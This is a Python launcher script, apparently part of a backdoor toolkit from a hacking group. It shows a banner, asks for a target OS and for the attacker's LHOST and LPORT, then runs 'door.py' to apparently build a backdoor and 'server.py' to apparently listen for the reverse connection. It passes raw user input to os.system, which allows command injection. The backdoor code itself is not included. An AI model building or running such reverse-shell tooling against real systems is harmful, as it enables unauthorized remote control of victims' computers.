#!/usr/bin/python3
#BU DOSYA TURK HACK TEAM'DAN HICHIGO TARAFINDAN YAZILMIŞTIR!AÇIK KAYNAKDIR GELİŞTİRİLMEYE AÇIKDIR!//AUTHOR = HICHIGO TURK HACK TEAM THIS IS A OPEN-SOURCE PROJECT!
import platform
import os
import time

class colors:
   platform = platform.system()
   if (platform == "Linux"):
       HEADER = '\033[95m'
       OKBLUE = '\033[94m'
       OKGREEN = '\033[92m'
       WARNING = '\033[93m'
       FAIL = '\033[91m'
       ENDC = '\033[0m'
       BOLD = '\033[1m'
       UNDERLINE = '\033[4m'
   else:
       HEADER = ''
       OKBLUE = ''
       OKGREEN = ''
       WARNING = ''
       FAIL = ''
       ENDC = ''
       BOLD = ''
       UNDERLINE = ''

BANNER = """ 
 	 _______  _   ___  _______  ___   _ 
	|  _    || | |   ||       ||   | | |
	| |_|   || |_|   ||       ||   |_| |
	|       ||       ||       ||      _|
	|  _   | |___    ||      _||     |_ 
	| |_|   |    |   ||     |_ |    _  |
	|_______|    |___||_______||___| |_|


"""

print (colors.OKBLUE + BANNER)
print (colors.OKGREEN+"                   By " + colors.WARNING+colors.BOLD + "Hichigo " + colors.ENDC+colors.OKGREEN + "from " +colors.BOLD+colors.FAIL+"THT")
print(colors.ENDC)

print(colors.OKGREEN+"         Lütfen Bir İşletim Sistemi Seçiniz!")
print(colors.WARNING+"         [1]"+colors.ENDC+"Linux")
print(colors.WARNING+"         [2]"+colors.ENDC+"Windows")

ops=input(colors.ENDC+"\n         Seçimim ->"+colors.OKGREEN)
print(colors.ENDC)

lhost = input(colors.ENDC+"         LHOST ->"+colors.OKGREEN)
lport = input(colors.ENDC+"         LPORT ->"+colors.OKGREEN)

print(colors.ENDC)

os.system("python3 door.py "+str(lhost)+" "+str(lport))
time.sleep(2)
os.system("python3 server.py "+str(lhost)+" "+str(lport))
